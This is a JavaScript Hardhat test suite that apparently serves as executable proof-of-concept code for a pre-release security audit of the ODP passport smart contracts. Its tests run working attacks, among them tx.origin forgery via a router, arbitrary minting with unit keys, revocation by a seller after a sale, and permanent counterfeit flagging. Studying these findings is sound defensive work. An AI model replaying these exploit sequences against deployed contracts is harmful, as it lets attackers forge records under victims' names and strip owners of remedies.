/**
 * @file ODP 0.7 pre-release audit — executable proofs of concept.
 *
 * Every test here ASSERTS THE BEHAVIOUR THAT EXISTS TODAY at commit d9e656e. A passing
 * run therefore means "the finding reproduces", not "the contract is fine". If a fix
 * lands, the corresponding test here must be inverted — that is the regression test.
 *
 * Run:  cd chain && npx hardhat test deploy/test/ODPAudit07.poc.test.js
 */
import { expect } from "chai";
import { network } from "hardhat";
import crypto from "node:crypto";

const { ethers } = await network.connect();

const TYPE_C = "0x43";
const TYPE_B = "0x42";
const TYPE_P = "0x50";
const MINT_SELF = "";

const ANCHOR_PHOTO = 1;
const ANCHOR_DIMENSIONS = 2;
const ANCHOR_MATERIALS = 4;
const ANCHOR_FEATURES = 8;
const ANCHOR_FILE_HASH = 32;
const ANCHOR_UNIT_KEY_SET = 4096;
const PHYS_MIN = ANCHOR_PHOTO | ANCHOR_DIMENSIONS | ANCHOR_MATERIALS | ANCHOR_FEATURES;

const EVENT_STATUS = 1;
const STATUS_ARCHIVED = 4;

const LIB_KEY = "project/contracts/ODPPassportLib.sol:ODPPassportLib";

const MINT_INPUTS_TYPE =
  "tuple(tuple(uint32 year,uint8 month,string title,string authorName,string shortDescription," +
  "string domain,uint8 contentClass,uint8 lifecycleStatus,uint8 aiStatus,uint8 verificationMethod," +
  "uint8 editionModel) core,bytes32 dataHash,string dataUrl,bytes32 imageHash,string imageUrl," +
  "bytes32 fileHash,bytes32 anchorsHash,uint32 anchorTypesMask,address initialOwner)";

function h(prefix, n) {
  return ethers.keccak256(ethers.toUtf8Bytes(`${prefix}:${n}`));
}

async function ym() {
  const b = await ethers.provider.getBlock("latest");
  const d = new Date(b.timestamp * 1000);
  return { year: d.getUTCFullYear(), month: d.getUTCMonth() + 1 };
}

async function core(overrides = {}) {
  const { year, month } = await ym();
  return {
    year,
    month,
    title: "Genuine work",
    authorName: "Genuine Author",
    shortDescription: "A real object",
    domain: "art",
    contentClass: 1,
    lifecycleStatus: 3,
    aiStatus: 1,
    verificationMethod: 1,
    editionModel: 1,
    ...overrides,
  };
}

async function physicalInputs(n, overrides = {}) {
  return {
    core: await core(overrides.core || {}),
    dataHash: h("data", n),
    dataUrl: "",
    imageHash: h("image", n),
    imageUrl: "",
    fileHash: ethers.ZeroHash,
    anchorsHash: h("anchors", n),
    anchorTypesMask: PHYS_MIN,
    initialOwner: ethers.ZeroAddress,
    ...Object.fromEntries(Object.entries(overrides).filter(([k]) => k !== "core")),
  };
}

async function digitalInputs(n, overrides = {}) {
  return {
    core: await core(overrides.core || {}),
    dataHash: h("data", n),
    dataUrl: "",
    imageHash: ethers.ZeroHash,
    imageUrl: "",
    fileHash: h("file", n),
    anchorsHash: h("anchors", n),
    anchorTypesMask: ANCHOR_FILE_HASH,
    initialOwner: ethers.ZeroAddress,
    ...Object.fromEntries(Object.entries(overrides).filter(([k]) => k !== "core")),
  };
}

async function deployRegistry() {
  const lib = await (await ethers.getContractFactory("ODPPassportLib")).deploy();
  await lib.waitForDeployment();
  const reg = await (
    await ethers.getContractFactory("ObjectDigitalPassport", {
      libraries: { [LIB_KEY]: await lib.getAddress() },
    })
  ).deploy();
  await reg.waitForDeployment();
  return { reg, libAddress: await lib.getAddress() };
}

async function lastPassportOf(reg, wallet) {
  const [ids] = await reg.getPassportsByCreatorPaged(wallet, 0, 200);
  return ids[ids.length - 1];
}

// ── Merkle helpers, mirroring SPEC §20.3 / ODPEditionUnits._proves ────────────

function sha256(...parts) {
  const d = crypto.createHash("sha256");
  for (const p of parts) d.update(Buffer.from(ethers.getBytes(p)));
  return "0x" + d.digest("hex");
}
function unitLeaf(i, addr) {
  return sha256(ethers.zeroPadValue(ethers.toBeHex(i), 4), addr);
}
function buildTree(leaves) {
  const levels = [leaves];
  let level = leaves;
  while (level.length > 1) {
    const next = [];
    for (let i = 0; i < level.length; i += 2) {
      next.push(sha256(level[i], i + 1 < level.length ? level[i + 1] : level[i]));
    }
    levels.push(next);
    level = next;
  }
  return { root: level[0], levels };
}
function proofFor(levels, index) {
  const proof = [];
  let idx = index;
  for (let d = 0; d < levels.length - 1; d++) {
    const level = levels[d];
    proof.push(level[(idx & 1) === 0 ? Math.min(idx + 1, level.length - 1) : idx - 1]);
    idx >>= 1;
  }
  return proof;
}
function unitWallets(n) {
  return Array.from({ length: n }, (_, i) =>
    new ethers.Wallet(ethers.keccak256(ethers.toUtf8Bytes(`unit-key-${i}`))),
  );
}

async function deployEditionWorld(unitCount = 4) {
  const { reg } = await deployRegistry();
  const units = await (await ethers.getContractFactory("ODPEditionUnits")).deploy(reg.target);
  await units.waitForDeployment();
  await (await reg.setEditionUnits(units.target)).wait();

  const signers = await ethers.getSigners();
  const brand = signers[1];
  await (await reg.connect(brand).registerCreator(TYPE_B)).wait();
  await (await reg.connect(brand).mintPhysical(await physicalInputs(1, { anchorTypesMask: PHYS_MIN | ANCHOR_UNIT_KEY_SET }), false, MINT_SELF)).wait();
  const editionId = await lastPassportOf(reg, brand.address);

  const keys = unitWallets(unitCount);
  const { root, levels } = buildTree(keys.map((w, i) => unitLeaf(i, w.address)));
  await (await units.connect(brand).openEdition(editionId, root, unitCount, ethers.ZeroAddress)).wait();

  return { reg, units, brand, editionId, keys, levels, unitCount, signers };
}

// ═════════════════════════════════════════════════════════════════════════════

describe("ODP 0.7 audit PoC", function () {
  // ── A. tx.origin substitution behind the extension router ──────────────────
  describe("A. extension router + tx.origin", function () {
    it("A1: a contract the victim calls mints a passport under the VICTIM's profile with attacker content", async function () {
      const { reg, libAddress } = await deployRegistry();
      const [gov, victim, attacker] = await ethers.getSigners();

      // Wiring exactly as chain/deploy/scripts/deploy.js does it (lines 123-140).
      const router = await (
        await ethers.getContractFactory("ODPExtensionMintRouter", { libraries: { [LIB_KEY]: libAddress } })
      ).deploy(reg.target);
      await router.waitForDeployment();
      await (await reg.connect(gov).setExtensionRouter(router.target)).wait();

      const ext = await (await ethers.getContractFactory("ODPPassThroughDigitalExtension")).deploy();
      await ext.waitForDeployment();
      const MINT_CLASS = "0x58"; // "X" — any byte that is not C/B/P/M
      await (await router.connect(gov).setMintExtension(MINT_CLASS, ext.target)).wait();

      // The victim is an ordinary registered creator.
      await (await reg.connect(victim).registerCreator(TYPE_C)).wait();
      const victimCreatorId = await reg.getCreatorByWallet(victim.address);

      // The attacker's contract. The victim believes they are calling something else.
      const probe = await (await ethers.getContractFactory("ODPAuditOriginProbe")).deploy();
      await probe.waitForDeployment();

      const forged = await digitalInputs(99, {
        core: { title: "FORGED BY ATTACKER", authorName: "Not the victim", shortDescription: "planted record" },
      });
      const payload = ethers.AbiCoder.defaultAbiCoder().encode([MINT_INPUTS_TYPE], [forged]);
      const routerCalldata = router.interface.encodeFunctionData("mintDigitalViaExtension", [
        MINT_CLASS,
        payload,
        false,
        MINT_SELF,
      ]);

      // The victim signs ONE transaction, to the attacker's contract. Nothing else.
      await (await probe.connect(victim).doSomethingHarmlessLooking(router.target, routerCalldata)).wait();

      const planted = await lastPassportOf(reg, victim.address);
      expect(planted, "a passport was created under the victim's wallet").to.be.a("string").and.not.equal("");

      const header = await reg.getPassportHeader(planted);
      expect(header.creator).to.equal(victim.address);
      expect(header.creatorId).to.equal(victimCreatorId);
      expect(header.title).to.equal("FORGED BY ATTACKER");
      expect(header.authorName).to.equal("Not the victim");
      // mintAgent is address(0): on-chain this looks exactly like the victim minting it themselves.
      const cls = await reg.getPassportClassification(planted);
      expect(cls.mintAgent).to.equal(ethers.ZeroAddress);
      expect(attacker.address).to.not.equal(header.creator);
    });

    it("A2: the card has no edit path, so the victim's only remedy is revoke + a permanent revoked record", async function () {
      const { reg } = await deployRegistry();
      const [, victim] = await ethers.getSigners();
      await (await reg.connect(victim).registerCreator(TYPE_C)).wait();
      await (await reg.connect(victim).mintDigital(await digitalInputs(1), false, MINT_SELF)).wait();
      const id = await lastPassportOf(reg, victim.address);

      // No setter exists for any card field.
      const names = reg.interface.fragments.filter((f) => f.type === "function").map((f) => f.name);
      expect(names.filter((n) => /^(setTitle|updateTitle|editCard|updatePassportCard)$/.test(n))).to.have.length(0);

      await (await reg.connect(victim).revokePassport(id, h("reason", 1))).wait();
      const cls = await reg.getPassportClassification(id);
      expect(cls.revoked).to.equal(true);
      // The forged card text stays readable forever.
      expect((await reg.getPassportHeader(id)).title).to.equal("Genuine work");
    });
  });

  // ── B. Edition unit keys ───────────────────────────────────────────────────
  describe("B. edition unit keys", function () {
    it("B1: a unit-key holder writes ARBITRARY card content into a passport attributed to the brand", async function () {
      const { reg, units, brand, editionId, keys, levels } = await deployEditionWorld(4);
      const [, , courier, buyer] = await ethers.getSigners();

      const idx = 0;
      const proof = proofFor(levels, idx);
      const actSig = await keys[idx].signMessage(
        ethers.getBytes(await units.activationPayloadHash(editionId, idx)),
      );
      await (await units.connect(courier).activate(editionId, idx, proof, actSig)).wait();

      const mintSig = await keys[idx].signMessage(
        ethers.getBytes(await units.mintPayloadHash(editionId, idx, buyer.address)),
      );
      const forged = await physicalInputs(500, {
        core: {
          title: "LIMITED EDITION — SIGNED BY THE FOUNDER",
          authorName: "The Brand",
          shortDescription: "Claims the brand never made",
          domain: "attacker.example",
        },
      });

      await (
        await units.connect(courier).mintUnitPassport(editionId, idx, buyer.address, proof, mintSig, forged, false)
      ).wait();

      const unitId = (await units.getUnitPassports(editionId, idx))[0];
      const header = await reg.getPassportHeader(unitId);

      // The signature covered only (edition, unitIndex, unitOwner). The card is whatever the caller sent.
      expect(header.title).to.equal("LIMITED EDITION — SIGNED BY THE FOUNDER");
      expect(header.shortDescription).to.equal("Claims the brand never made");
      // ...yet it is attributed on-chain to the brand's wallet and profile.
      expect(header.creator).to.equal(brand.address);
      expect(header.creatorId).to.equal(await reg.getCreatorByWallet(brand.address));
      expect(header.owner).to.equal(buyer.address);

      // And it is listed among the brand's own issuance.
      const [ids] = await reg.getPassportsByCreatorPaged(brand.address, 0, 200);
      expect(ids).to.include(unitId);
    });

    it("B2: ONE unit key mints an unbounded number of passports under the brand, bypassing monthly caps", async function () {
      const { reg, units, brand, editionId, keys, levels } = await deployEditionWorld(4);
      const [, , courier] = await ethers.getSigners();

      const idx = 1;
      const proof = proofFor(levels, idx);
      await (
        await units
          .connect(courier)
          .activate(
            editionId,
            idx,
            proof,
            await keys[idx].signMessage(ethers.getBytes(await units.activationPayloadHash(editionId, idx))),
          )
      ).wait();

      const before = (await reg.getPassportsByCreatorPaged(brand.address, 0, 500))[1];

      // `unitOwner` is free, and _mintedForOwner is keyed on it. A fresh address each time.
      const N = 5;
      for (let i = 0; i < N; i++) {
        const owner = ethers.Wallet.createRandom().address;
        const sig = await keys[idx].signMessage(
          ethers.getBytes(await units.mintPayloadHash(editionId, idx, owner)),
        );
        await (
          await units
            .connect(courier)
            .mintUnitPassport(editionId, idx, owner, proof, sig, await physicalInputs(600 + i), false)
        ).wait();
      }

      const after = (await reg.getPassportsByCreatorPaged(brand.address, 0, 500))[1];
      expect(after - before).to.equal(BigInt(N));
      expect((await units.getUnitPassports(editionId, idx)).length).to.equal(N);
    });

    it("B3: a REVOKED issuer profile still issues unit passports (mintUnitPassport skips _beginMint)", async function () {
      const { reg, units, brand, editionId, keys, levels } = await deployEditionWorld(4);
      const [, , courier, buyer] = await ethers.getSigners();

      const idx = 2;
      const proof = proofFor(levels, idx);
      await (
        await units
          .connect(courier)
          .activate(
            editionId,
            idx,
            proof,
            await keys[idx].signMessage(ethers.getBytes(await units.activationPayloadHash(editionId, idx))),
          )
      ).wait();

      // The brand stops its own profile — the documented remedy for a stolen key.
      await (await reg.connect(brand).revokeCreator()).wait();

      // Direct paths are correctly blocked...
      await expect(reg.connect(brand).mintPhysical(await physicalInputs(700), false, MINT_SELF))
        .to.be.revertedWithCustomError(reg, "EC")
        .withArgs(131n);

      // ...but the unit path is not.
      const sig = await keys[idx].signMessage(
        ethers.getBytes(await units.mintPayloadHash(editionId, idx, buyer.address)),
      );
      await (
        await units
          .connect(courier)
          .mintUnitPassport(editionId, idx, buyer.address, proof, sig, await physicalInputs(701), false)
      ).wait();

      const unitId = (await units.getUnitPassports(editionId, idx))[0];
      const header = await reg.getPassportHeader(unitId);
      expect(header.creatorId).to.equal(await reg.getCreatorByWallet(brand.address));
      // The profile is revoked, and a passport was nonetheless issued in its name.
      const cr = await reg.getCreator(header.creatorId);
      expect(cr.revokedAt).to.be.greaterThan(0n);
    });

    it("B4: any holder of any one unit key permanently destroys the issuer's revocation remedy for the whole edition", async function () {
      const { reg, units, brand, editionId, keys, levels } = await deployEditionWorld(4);
      const [gov, , hostile] = await ethers.getSigners();

      // Before: the issuer can still revoke (a typo in the card, a wrong photo, a cancelled run).
      expect(await reg.isRevocationLocked(editionId)).to.equal(false);

      const idx = 3;
      await (
        await units
          .connect(hostile)
          .activate(
            editionId,
            idx,
            proofFor(levels, idx),
            await keys[idx].signMessage(ethers.getBytes(await units.activationPayloadHash(editionId, idx))),
          )
      ).wait();

      expect(await reg.isRevocationLocked(editionId)).to.equal(true);

      await expect(reg.connect(brand).revokePassport(editionId, h("typo", 1)))
        .to.be.revertedWithCustomError(reg, "EC")
        .withArgs(116n);
      // Governance cannot override it either — there is no unlock for any caller.
      await expect(reg.connect(gov).revokePassport(editionId, h("typo", 2)))
        .to.be.revertedWithCustomError(reg, "EC")
        .withArgs(116n);
    });
  });

  // ── C. Creator power over a passport after it is sold ──────────────────────
  describe("C. creator vs owner after transfer", function () {
    it("C1: after a sale the ORIGINAL creator can still revoke, re-point URLs and rewrite lifecycle status", async function () {
      const { reg } = await deployRegistry();
      const [, artist, buyer] = await ethers.getSigners();
      await (await reg.connect(artist).registerCreator(TYPE_C)).wait();
      await (await reg.connect(artist).mintPhysical(await physicalInputs(10, { dataUrl: "https://artist.example/p.odpass" }), false, MINT_SELF)).wait();
      const id = await lastPassportOf(reg, artist.address);

      await (await reg.connect(artist).transferPassport(id, buyer.address)).wait();
      expect((await reg.getPassportHeader(id)).owner).to.equal(buyer.address);

      const dataHash = (await reg.getPassportMedia(id)).dataHash;

      // The seller re-points the bundle URL of an object they no longer own.
      await (await reg.connect(artist).updatePassportUrls(id, "https://attacker.example/evil.odpass", "", dataHash)).wait();
      expect((await reg.getPassportMedia(id)).dataUrl).to.equal("https://attacker.example/evil.odpass");

      // The seller marks the buyer's object archived.
      await (await reg.connect(artist).recordPassportEvent(id, EVENT_STATUS, STATUS_ARCHIVED, "", ethers.ZeroHash, "")).wait();
      expect((await reg.getPassportEvents(id)).lifecycleStatus).to.equal(STATUS_ARCHIVED);

      // The buyer cannot revoke their own record...
      await expect(reg.connect(buyer).revokePassport(id, h("mine", 1)))
        .to.be.revertedWithCustomError(reg, "EC")
        .withArgs(17n);
      // ...but the seller can, unilaterally and irreversibly.
      await (await reg.connect(artist).revokePassport(id, h("seller", 1))).wait();
      expect((await reg.getPassportClassification(id)).revoked).to.equal(true);
    });

    it("C2: revokeCreator() does NOT stop a stolen key from revoking every passport that profile ever issued", async function () {
      const { reg } = await deployRegistry();
      const [, artist, buyer] = await ethers.getSigners();
      await (await reg.connect(artist).registerCreator(TYPE_C)).wait();
      for (let i = 0; i < 3; i++) {
        await (await reg.connect(artist).mintPhysical(await physicalInputs(20 + i), false, MINT_SELF)).wait();
      }
      const [ids] = await reg.getPassportsByCreatorPaged(artist.address, 0, 50);
      await (await reg.connect(artist).transferPassport(ids[0], buyer.address)).wait();

      // The documented response to a compromise: stop the profile.
      await (await reg.connect(artist).revokeCreator()).wait();
      expect((await reg.getCreator(await reg.getCreatorByWallet(artist.address))).revokedAt).to.be.greaterThan(0n);

      // The key still holds p.creator on every past passport. Nothing consults revokedAt here.
      for (const id of ids) {
        await (await reg.connect(artist).revokePassport(id, h("burn", id))).wait();
        expect((await reg.getPassportClassification(id)).revoked).to.equal(true);
      }
      // Including the one that had already been sold.
      expect((await reg.getPassportHeader(ids[0])).owner).to.equal(buyer.address);
    });

    it("C3: a buyer permanently squats the one-shot author attestation slot", async function () {
      const { reg } = await deployRegistry();
      const attest = await (await ethers.getContractFactory("ODPAuthorAttestation")).deploy(reg.target);
      await attest.waitForDeployment();

      const [, artist, buyer] = await ethers.getSigners();
      await (await reg.connect(artist).registerCreator(TYPE_C)).wait();
      await (await reg.connect(artist).mintPhysical(await physicalInputs(30), false, MINT_SELF)).wait();
      const id = await lastPassportOf(reg, artist.address);
      await (await reg.connect(artist).transferPassport(id, buyer.address)).wait();

      const header = await reg.getPassportHeader(id);
      const dataHash = (await reg.getPassportMedia(id)).dataHash;
      const forgedAuthorKey = ethers.Wallet.createRandom();

      const digest = await attest.hashAuthorAttestation(id, dataHash, header.creatorId, forgedAuthorKey.address);
      const sig = forgedAuthorKey.signingKey.sign(digest).serialized;

      await (await attest.connect(buyer).attestAuthor(id, forgedAuthorKey.address, sig)).wait();

      const [attested, signer] = await attest.getAuthorAttestation(id);
      expect(attested).to.equal(true);
      expect(signer).to.equal(forgedAuthorKey.address);

      // The real artist can never bind their own key afterwards — one shot, no reset.
      const realKey = ethers.Wallet.createRandom();
      const d2 = await attest.hashAuthorAttestation(id, dataHash, header.creatorId, realKey.address);
      await expect(attest.connect(artist).attestAuthor(id, realKey.address, realKey.signingKey.sign(d2).serialized))
        .to.be.revertedWithCustomError(attest, "EC")
        .withArgs(111n);
    });
  });

  // ── D. Open P/M registration ───────────────────────────────────────────────
  describe("D. open institutional registration", function () {
    it("D1: anyone self-registers as P and permanently flags a stranger's passport; only they can clear it", async function () {
      const { reg } = await deployRegistry();
      const cf = await (await ethers.getContractFactory("ODPCounterfeitConcern")).deploy(reg.target);
      await cf.waitForDeployment();

      const [gov, artist, attacker] = await ethers.getSigners();
      await (await reg.connect(artist).registerCreator(TYPE_C)).wait();
      await (await reg.connect(artist).mintPhysical(await physicalInputs(40), false, MINT_SELF)).wait();
      const id = await lastPassportOf(reg, artist.address);

      // Registration as a "proof institution" is permissionless and costs only gas.
      await (await reg.connect(attacker).registerCreator(TYPE_P)).wait();
      await (await cf.connect(attacker).raiseCounterfeitConcern(id, h("fake", 1))).wait();

      const [active, prover] = await cf.getCounterfeitConcern(id);
      expect(active).to.equal(true);
      expect(prover).to.equal(await reg.getCreatorByWallet(attacker.address));

      // The artist cannot clear it (not the raiser); governance has no power here at all.
      await expect(cf.connect(artist).clearCounterfeitConcern(id))
        .to.be.revertedWithCustomError(cf, "EC")
        .withArgs(82n);
      await expect(cf.connect(gov).clearCounterfeitConcern(id))
        .to.be.revertedWithCustomError(cf, "EC")
        .withArgs(7n);
    });

    it("D2: satellites cannot see profile revocation — a stopped P profile keeps flagging", async function () {
      const { reg } = await deployRegistry();
      const cf = await (await ethers.getContractFactory("ODPCounterfeitConcern")).deploy(reg.target);
      await cf.waitForDeployment();

      const [, artist, inst] = await ethers.getSigners();
      await (await reg.connect(artist).registerCreator(TYPE_C)).wait();
      await (await reg.connect(artist).mintPhysical(await physicalInputs(41), false, MINT_SELF)).wait();
      const id = await lastPassportOf(reg, artist.address);

      await (await reg.connect(inst).registerCreator(TYPE_P)).wait();
      await (await reg.connect(inst).revokeCreator()).wait();
      expect((await reg.getCreator(await reg.getCreatorByWallet(inst.address))).revokedAt).to.be.greaterThan(0n);

      // The satellite reads a 4-field CreatorRecord copy; revokedAt is invisible to it.
      await (await cf.connect(inst).raiseCounterfeitConcern(id, h("fake", 2))).wait();
      expect((await cf.getCounterfeitConcern(id))[0]).to.equal(true);
    });

    it("D3: the stale 4-field CreatorRecord copy decodes without reverting (silent, not loud)", async function () {
      const { reg } = await deployRegistry();
      const [, w] = await ethers.getSigners();
      await (await reg.connect(w).registerCreator(TYPE_B)).wait();
      const creatorId = await reg.getCreatorByWallet(w.address);

      const full = await reg.getCreator(creatorId);
      expect(full.revokedAt).to.equal(0n);

      // Decode the same returndata through the satellites' 4-field shape.
      const raw = await ethers.provider.call({
        to: reg.target,
        data: reg.interface.encodeFunctionData("getCreator", [creatorId]),
      });
      const asFour = ethers.AbiCoder.defaultAbiCoder().decode(
        ["tuple(string creatorId,address wallet,bytes1 typePrefix,uint256 timestamp)"],
        raw,
      )[0];
      expect(asFour.creatorId).to.equal(full.creatorId);
      expect(asFour.wallet).to.equal(full.wallet);
      expect(asFour.typePrefix).to.equal(full.typePrefix);
      expect(asFour.timestamp).to.equal(full.timestamp);
      // The 5th field is silently dropped: no revert, no warning, just a blind satellite.
    });
  });

  // ── E. What a client can and cannot recover ────────────────────────────────
  describe("E. events and client recovery", function () {
    it("E1: passportId is NOT recoverable from the receipt — the topic holds only keccak256 of the id", async function () {
      const { reg } = await deployRegistry();
      const [, w] = await ethers.getSigners();
      await (await reg.connect(w).registerCreator(TYPE_C)).wait();
      const rcpt = await (await reg.connect(w).mintDigital(await digitalInputs(50), false, MINT_SELF)).wait();

      const parsed = rcpt.logs.map((l) => { try { return reg.interface.parseLog(l); } catch { return null; } })
        .find((p) => p && p.name === "PassportMinted");
      expect(parsed, "PassportMinted was emitted").to.not.equal(undefined);

      const actualId = await lastPassportOf(reg, w.address);
      // ethers hands back an Indexed placeholder, not the string. This is what
      // chain/deploy/scripts/deploy.js:219 prints as "Passport ID".
      expect(typeof parsed.args.passportId).to.not.equal("string");
      expect(parsed.args.passportId.hash).to.equal(ethers.keccak256(ethers.toUtf8Bytes(actualId)));

      // Nothing else in the log carries the id, the owner, imageHash or fileHash.
      const fields = parsed.fragment.inputs.map((i) => i.name);
      expect(fields).to.not.include("owner");
      expect(fields).to.not.include("initialOwner");
      expect(fields).to.not.include("imageHash");
      expect(fields).to.not.include("fileHash");
    });

    it("E2: an initialOwner recipient cannot find their passport from logs or from the creator index", async function () {
      const { reg } = await deployRegistry();
      const [, issuer, recipient] = await ethers.getSigners();
      await (await reg.connect(issuer).registerCreator(TYPE_C)).wait();
      await (await reg.connect(issuer).mintPhysical(await physicalInputs(60, { initialOwner: recipient.address }), false, MINT_SELF)).wait();

      const id = await lastPassportOf(reg, issuer.address);
      expect((await reg.getPassportHeader(id)).owner).to.equal(recipient.address);

      // The only index is by CREATOR wallet. The owner has none.
      const [ownerSide, ownerTotal] = await reg.getPassportsByCreatorPaged(recipient.address, 0, 50);
      expect(ownerTotal).to.equal(0n);
      expect(ownerSide).to.have.length(0);

      // And no event carries the owner, so a log filter cannot find it either.
      const logs = await ethers.provider.getLogs({
        address: reg.target,
        fromBlock: 0,
        toBlock: "latest",
        topics: [reg.interface.getEvent("PassportMinted").topicHash],
      });
      expect(logs.length).to.be.greaterThan(0);
      for (const l of logs) {
        expect(JSON.stringify(l.topics).toLowerCase()).to.not.include(recipient.address.slice(2).toLowerCase());
      }
    });

    it("E3: the deploy script's own smoke-test mint tuple no longer matches the 0.7 ABI", async function () {
      // chain/deploy/scripts/deploy.js:186-207 builds the tuple without `initialOwner`.
      const tupleWithoutInitialOwner = {
        core: await core(),
        dataHash: h("smoke", 1),
        dataUrl: "https://example.com/passport.odpass",
        imageHash: ethers.ZeroHash,
        imageUrl: "",
        fileHash: h("smoke-file", 1),
        anchorsHash: h("smoke-anchors", 1),
        anchorTypesMask: ANCHOR_FILE_HASH,
      };
      expect(() =>
        ethers.AbiCoder.defaultAbiCoder().encode([MINT_INPUTS_TYPE], [tupleWithoutInitialOwner]),
      ).to.throw();
    });
  });

  // ── F. Freeze and governance ───────────────────────────────────────────────
  describe("F. freeze and governance", function () {
    it("F1: handing governance to a multisig does not take freeze() away from the deployer", async function () {
      const { reg } = await deployRegistry();
      const [deployer, multisig, artist] = await ethers.getSigners();

      await (await reg.connect(deployer).transferGovernance(multisig.address)).wait();
      expect(await reg.governance()).to.equal(multisig.address);
      expect(await reg.deployer()).to.equal(deployer.address);

      // The new governance cannot freeze...
      await expect(reg.connect(multisig).freeze()).to.be.revertedWithCustomError(reg, "EC").withArgs(57n);
      // ...and cannot take the power away from the old deployer key either: no setter exists.
      const names = reg.interface.fragments.filter((f) => f.type === "function").map((f) => f.name);
      expect(names).to.not.include("transferDeployer");
      expect(names).to.not.include("renounceFreeze");

      await (await reg.connect(deployer).freeze()).wait();
      expect(await reg.frozen()).to.equal(true);

      // Freeze stops the owner from moving their own record, and stops revocation.
      await expect(reg.connect(artist).registerCreator(TYPE_C))
        .to.be.revertedWithCustomError(reg, "EC").withArgs(58n);
    });

    it("F2: freeze locks owners out of transfer and revocation, permanently", async function () {
      const { reg } = await deployRegistry();
      const [deployer, artist, buyer] = await ethers.getSigners();
      await (await reg.connect(artist).registerCreator(TYPE_C)).wait();
      await (await reg.connect(artist).mintPhysical(await physicalInputs(70), false, MINT_SELF)).wait();
      const id = await lastPassportOf(reg, artist.address);

      await (await reg.connect(deployer).freeze()).wait();

      await expect(reg.connect(artist).transferPassport(id, buyer.address))
        .to.be.revertedWithCustomError(reg, "EC").withArgs(58n);
      await expect(reg.connect(artist).revokePassport(id, h("r", 1)))
        .to.be.revertedWithCustomError(reg, "EC").withArgs(58n);
      await expect(reg.connect(artist).recordPassportEvent(id, EVENT_STATUS, 2, "", ethers.ZeroHash, ""))
        .to.be.revertedWithCustomError(reg, "EC").withArgs(58n);

      // Reads still work — the record is readable but frozen in place.
      expect((await reg.getPassportHeader(id)).owner).to.equal(artist.address);
    });

    it("F3: satellites keep accepting writes after the registry is frozen", async function () {
      const { reg } = await deployRegistry();
      const cf = await (await ethers.getContractFactory("ODPCounterfeitConcern")).deploy(reg.target);
      await cf.waitForDeployment();
      const anchor = await (await ethers.getContractFactory("ODPWalletDocumentAnchor")).deploy(reg.target);
      await anchor.waitForDeployment();

      const [deployer, artist, inst] = await ethers.getSigners();
      await (await reg.connect(artist).registerCreator(TYPE_C)).wait();
      await (await reg.connect(artist).mintPhysical(await physicalInputs(80), false, MINT_SELF)).wait();
      const id = await lastPassportOf(reg, artist.address);
      await (await reg.connect(inst).registerCreator(TYPE_P)).wait();

      await (await reg.connect(deployer).freeze()).wait();

      // The registry is closed, but a satellite can still attach a permanent accusation to it,
      // and the passport can no longer be revoked or annotated in response.
      await (await cf.connect(inst).raiseCounterfeitConcern(id, h("post-freeze", 1))).wait();
      expect((await cf.getCounterfeitConcern(id))[0]).to.equal(true);

      await (await anchor.connect(artist).attestExternalDocument(h("doc", 1), "")).wait();
      expect((await anchor.getExternalDocumentAttestation(artist.address, h("doc", 1)))[0]).to.equal(true);

      await expect(reg.connect(artist).recordPassportEvent(id, 7, 0, "disputed", ethers.ZeroHash, ""))
        .to.be.revertedWithCustomError(reg, "EC").withArgs(58n);
    });

    it("F4: satellite rebinding is silent — no event records a change of governance or of any satellite", async function () {
      const { reg } = await deployRegistry();
      const [deployer, multisig] = await ethers.getSigners();

      const events = reg.interface.fragments.filter((f) => f.type === "event").map((f) => f.name);
      expect(events).to.not.include("GovernanceTransferred");
      expect(events).to.not.include("RelationsSatelliteUpdated");
      expect(events).to.not.include("ExtensionRouterUpdated");
      expect(events).to.not.include("EditionUnitsUpdated");

      const r1 = await (await reg.connect(deployer).transferGovernance(multisig.address)).wait();
      expect(r1.logs.filter((l) => { try { return !!reg.interface.parseLog(l); } catch { return false; } })).to.have.length(0);

      const r2 = await (await reg.connect(multisig).setEditionUnits(multisig.address)).wait();
      expect(r2.logs).to.have.length(0);

      // relationsSatellite and extensionRouter are `private` with no getter at all.
      const names = reg.interface.fragments.filter((f) => f.type === "function").map((f) => f.name);
      expect(names).to.not.include("relationsSatellite");
      expect(names).to.not.include("extensionRouter");
      expect(names).to.include("editionUnits");
    });
  });

  // ── G. Hashes and masks ────────────────────────────────────────────────────
  describe("G. what the anchors prove", function () {
    it("G1: anchorTypesMask is self-declared — a mint may claim anchors it does not have", async function () {
      const { reg } = await deployRegistry();
      const [, w] = await ethers.getSigners();
      await (await reg.connect(w).registerCreator(TYPE_C)).wait();

      // Claims photo+dimensions+materials+features, plus B-only edition bits, plus a reserved bit.
      const RESERVED_BIT_20 = 1 << 20;
      const mask = PHYS_MIN | ANCHOR_UNIT_KEY_SET | (1 << 13) | RESERVED_BIT_20;
      await (await reg.connect(w).mintPhysical(await physicalInputs(90, { anchorTypesMask: mask }), false, MINT_SELF)).wait();
      const id = await lastPassportOf(reg, w.address);
      expect((await reg.getPassportMedia(id)).anchorTypesMask).to.equal(mask);
      // A C profile just set UNIT_KEY_SET, documented as "B profiles only".
      expect((await reg.getCreator(await reg.getCreatorByWallet(w.address))).typePrefix).to.equal(TYPE_C);
    });

    it("G2: two different profiles register the very same file — no global uniqueness", async function () {
      const { reg } = await deployRegistry();
      const [, real, thief] = await ethers.getSigners();
      await (await reg.connect(real).registerCreator(TYPE_C)).wait();
      await (await reg.connect(thief).registerCreator(TYPE_C)).wait();

      const shared = await digitalInputs(100);
      await (await reg.connect(real).mintDigital(shared, false, MINT_SELF)).wait();
      await (await reg.connect(thief).mintDigital({ ...shared, core: { ...shared.core, authorName: "Impostor" } }, false, MINT_SELF)).wait();

      const a = await lastPassportOf(reg, real.address);
      const b = await lastPassportOf(reg, thief.address);
      expect(a).to.not.equal(b);
      const ma = await reg.getPassportMedia(a);
      const mb = await reg.getPassportMedia(b);
      expect(ma.fileHash).to.equal(mb.fileHash);
      expect(ma.dataHash).to.equal(mb.dataHash);
      // Only the mint timestamp separates them.
      expect((await reg.getPassportClassification(a)).timestamp)
        .to.be.at.most((await reg.getPassportClassification(b)).timestamp);
    });
  });
});
